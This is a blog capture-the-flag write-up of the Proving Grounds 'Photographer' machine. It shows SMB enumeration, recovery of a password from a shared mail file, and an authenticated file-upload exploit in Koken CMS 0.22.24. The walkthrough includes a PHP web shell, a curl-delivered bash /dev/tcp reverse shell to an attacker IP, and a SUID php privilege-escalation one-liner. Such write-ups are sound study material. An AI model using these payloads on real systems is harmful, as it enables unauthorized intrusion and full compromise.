<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Photographer - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary of ResultWith a valid credetials acquired from SMB service, we attain the initial foothold by exploiting the Authenticated Remote Code Execution (RCE...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/photographer-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Photographer - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/photographer-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Photographer - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> September 03, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i> Tags:  | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//pg">pg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 6 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary of Result</strong></h1><p>With a valid credetials acquired from <code class="language-plaintext highlighter-rouge">SMB</code> service, we attain the initial foothold by exploiting the <code class="language-plaintext highlighter-rouge">Authenticated Remote Code Execution</code> (RCE) of the vulnerable <code class="language-plaintext highlighter-rouge">Koken CMS</code>. We then escalate our privilege by abusing a <strong>misconfigured</strong> <code class="language-plaintext highlighter-rouge">SUID binary</code> and successfully compromise <code class="language-plaintext highlighter-rouge">root</code> access.</p><hr><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We’ll begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:    
|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f <span class="o">(</span>RSA<span class="o">)</span>          
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq9GoYsvJTOUcsgHSES9+20Ix4Q8wjm5slMheJ2ME+COokAqxBzXSr458KBmHv3bsTLWAH9FxoXJ6zrzDPmPApcqVifB4aI9l/VYxoeJCj54kKIQlCKkWTZjsAeLBI2Lk2+yJLLFWPTAZ2htwRAwCl
9z8YV3xgtqhTa+5BqIm/GInW4PYV0zi9zOMn2g4jNSWvy91FBUboGLwVgNYslGBydNW8Fhz8X/LXHZ1x6ulA76W026VEGOiQfoiIi84IFi9CbP8GIKfQ7BHuDlMqgiN9+w7K0z0oFdtiFhAS/48w89MYn6UOzw7Aaa9eLQi0+zxpW5SpCpw0mC2euzPxow
2Z
|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz4UG2gfu7L/Lxcqek1pZf46d8SocbES1A2a/XUYQgTmIqJuCEpLf3ERgVXS+7Lwdi6+F3xkI/lYFCA5MkRUQA<span class="o">=</span>
|   256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL5ZwzA5dpqtWx4ZzjVQ6NMzVUia8/We8txfiAn+mv4
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>   
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
8000/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: Koken 0.22.24            
| http-methods:      
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: daisa ahomi
</code></pre></div></div><p>→ There are a few running services. Within the scope of this writeup, we are interested in the <code class="language-plaintext highlighter-rouge">SMB/445</code> and <code class="language-plaintext highlighter-rouge">HTTP/8000</code> services.</p><p><br></p><h5 id="smb-enumeration"><strong>SMB Enumeration</strong></h5><p>Let’s us start listing shares utilizing <code class="language-plaintext highlighter-rouge">smbclient</code> without providing password.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="nv">$IP</span>
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
</span></code></pre></div></div><p>From the result, we discover that <code class="language-plaintext highlighter-rouge">anonymous</code> access is available for the <code class="language-plaintext highlighter-rouge">sambashare</code> share.</p><p>Let’s us further drop an interactive shell in the <code class="language-plaintext highlighter-rouge">sambashare</code> by running the following command.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="se">\\\\</span><span class="nv">$IP</span><span class="se">\\</span>sambashare
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Aug 20 11:51:08 2020
  ..                                  D        0  Thu Aug 20 12:08:59 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020

                3300080 blocks of size 1024. 2958792 blocks available
</span></code></pre></div></div><p>There are two files: <code class="language-plaintext highlighter-rouge">mailsent.txt</code> and <code class="language-plaintext highlighter-rouge">wordpress.bkp.zip</code>. To download them, from the <code class="language-plaintext highlighter-rouge">SMB</code> shell, we continue executing.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
                3300080 blocks of size 1024. 2958792 blocks available
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
Get file mailsent.txt? y
getting file <span class="se">\m</span>ailsent.txt of size 503 as mailsent.txt <span class="o">(</span>245.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 245.6 KiloBytes/sec<span class="o">)</span>
Get file wordpress.bkp.zip? y
getting file <span class="se">\w</span>ordpress.bkp.zip of size 13930308 as wordpress.bkp.zip <span class="o">(</span>183835.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 179004.0 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div><p>After those files are downloaded, let’s us inspect the content of <code class="language-plaintext highlighter-rouge">mailsent.txt</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>mailsent.txt 
...
To: Daisa Ahomi &lt;daisa@photographer.com&gt;
...
Hi Daisa!
Your site is ready now.
Don<span class="s1">'t forget your secret, my babygirl ;)
</span></code></pre></div></div><p>Here are some important info that we might notice:</p><p>→ Potential email: <code class="language-plaintext highlighter-rouge">daisa@photographer.com</code>.</p><p>→ Potential user: <code class="language-plaintext highlighter-rouge">daisa</code>.</p><p>→ Potential pass: <code class="language-plaintext highlighter-rouge">babygirl</code>.</p><p><br></p><h4 id="http8000"><strong>HTTP/8000</strong></h4><p>Now, let’s us gather some hidden directories of the web application.</p><p>This can be done with <code class="language-plaintext highlighter-rouge">ffuf</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://<span class="nv">$IP</span>:8000/FUZZ <span class="nt">-w</span> common.txt
admin                   <span class="o">[</span>Status: 301, Size: 321, Words: 20, Lines: 10]
app                     <span class="o">[</span>Status: 301, Size: 319, Words: 20, Lines: 10]
index.php               <span class="o">[</span>Status: 200, Size: 4603, Words: 206, Lines: 95]
server-status           <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10]
storage                 <span class="o">[</span>Status: 301, Size: 323, Words: 20, Lines: 10]
</code></pre></div></div><p><code class="language-plaintext highlighter-rouge">admin</code> appears to be compelling, navigate to the site, we discover that it’s running <code class="language-plaintext highlighter-rouge">Koken CMS 0.22.24</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.57.76:8000/admin/
...
        &lt;title&gt;Koken&lt;/title&gt;

        &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/console_0.22.24.min.css"</span> /&gt;
...
</code></pre></div></div><p>Conducting a few additional researches, the <code class="language-plaintext highlighter-rouge">Koken CMS</code> is known to be vulnerable to <strong>Authenticated Arbitrary File Upload</strong>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit koken
<span class="nt">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                                         |  Path
<span class="nt">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Koken CMS 0.22.24 - Arbitrary File Upload <span class="o">(</span>Authenticated<span class="o">)</span>                                                                                                              | php/webapps/48706.txt
<span class="nt">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="koken-cms-rce"><strong>Koken CMS RCE</strong></h4><p>Following the steps in the <a href="https://www.exploit-db.com/exploits/48706">PoC</a>, we first need to authenticate as the <code class="language-plaintext highlighter-rouge">admin</code> user with the credentials that we’ve obtained earlier - <code class="language-plaintext highlighter-rouge">daisa@photographer.com:babygirl</code>.</p><p>[1]. Create a malicious <code class="language-plaintext highlighter-rouge">.php.jpg</code> file with the following contents.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>image.php.jpg
&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>?&gt;
</code></pre></div></div><p>[2]. From the <code class="language-plaintext highlighter-rouge">Koken CMS Dashboard</code>:</p><ul><li><p>Click on <code class="language-plaintext highlighter-rouge">Import Content</code> in the <code class="language-plaintext highlighter-rouge">Library</code> tab → import <code class="language-plaintext highlighter-rouge">image.php.jpg</code> → intercept the request with <code class="language-plaintext highlighter-rouge">Burp</code>.</p></li><li><p>Rename the file to <code class="language-plaintext highlighter-rouge">image.php</code>.</p></li><li><p><code class="language-plaintext highlighter-rouge">Forward</code> the request.</p></li></ul><p>The final payload might look like the following.</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api.php?/content HTTP/1.1
Host: 192.168.57.76:8000
...
-----------------------------392967243522561067211768914619
Content-Disposition: form-data; name="name"

image.php
...
-----------------------------392967243522561067211768914619
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: image/jpeg

<span class="cp">&lt;?php system(['cmd']); ?&gt;</span>

-----------------------------392967243522561067211768914619--
</code></pre></div></div><p>[3]. In the similar <code class="language-plaintext highlighter-rouge">Dashboard</code>, hover the mouse on <code class="language-plaintext highlighter-rouge">Download File</code> to inspect the uploaded <strong>link location</strong>.</p><p>If file is uploaded properly, we can pull a reverse shell using the below command.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.57.76:8000/storage/originals/1e/26/image.php?cmd<span class="o">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.57.200%2F80%200%3E%261%27
</code></pre></div></div><p>Our <code class="language-plaintext highlighter-rouge">nc</code> should catch the reverse shell at port 80 as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 80
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>192.168.57.200] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.57.76] 37502
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1383<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device                                                                                                                                                             
bash: no job control <span class="k">in </span>this shell
www-data@photographer:/var/www/html/koken/storage/originals/1e/26<span class="nv">$ </span><span class="nb">id                                                                                                                                                                     
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>             
</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="misconfigured-suid-binary"><strong>Misconfigured SUID Binary</strong></h4><p>Locally navigate around the system divulges a misconfigured <code class="language-plaintext highlighter-rouge">SUID binary</code> that ends up privilege escalation.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/var/www<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-al</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null                                                                                                                                                           
&lt;www<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-al</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null                       
...
<span class="nt">-rwsr-xr-x</span> 1 root root 4883680 Jul  9  2020 /usr/bin/php7.2
...
</code></pre></div></div><p>With the <code class="language-plaintext highlighter-rouge">www-data</code> shell, we execute</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/var/www<span class="nv">$ </span>/usr/bin/php7.2 <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/bash', ['-p']);"</span>
root@photographer:/var/www# <span class="nb">whoami
</span>root
</code></pre></div></div><p>and successfully compromise <code class="language-plaintext highlighter-rouge">root</code>!.</p><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with <a href="https://jekyllrb.com" target="_blank">Jekyll</a> using <a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a> Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>